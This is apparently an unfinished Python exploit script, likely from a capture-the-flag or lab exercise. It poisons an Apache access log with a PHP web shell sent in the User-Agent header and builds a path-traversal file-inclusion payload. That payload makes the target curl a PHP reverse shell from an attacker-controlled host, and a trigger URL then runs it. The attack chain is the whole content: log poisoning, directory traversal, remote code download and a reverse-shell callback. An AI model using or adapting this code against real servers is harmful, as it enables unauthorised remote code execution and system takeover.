import requests
import http.server
import socketserver
import argparse
import urllib
import os

#Temporary hard-coded variables
LHOSTS = "192.168.0.1"
RHOSTS = "10.0.0.1"
PORT = 80
RPORT = 4444 #default
RSHELL = "./php-reverse-shell.php" # default

POISON =  " \"<?php system($_GET['c']); ?>\" "
PAYLOAD = RHOSTS + "/?view=dog/../../../../../../var/log/apache2/access.log&ext=&c="\
 + urllib.parse.quote(f"curl {LHOSTS}/php-reverse-shell.php --output shell.php")

TRIGGER = f"{RHOSTS}/?view=dog/../shell&IP={LHOSTS}"

def serve_reverse_shell():
    pass

def main():
    print("[*] Poisoning Apache log file with command injection...")
    response = requests.get("http://" + RHOSTS,headers={"user-agent" : POISON})
    if response.status_code != 200:
        print("[!] Error, server rejected request. Maybe wrong ip address?")
        exit()
    else:
        print("[*] Done.")
        # ADD Status saving here!
    
    

if __name__ == '__main__':
    main()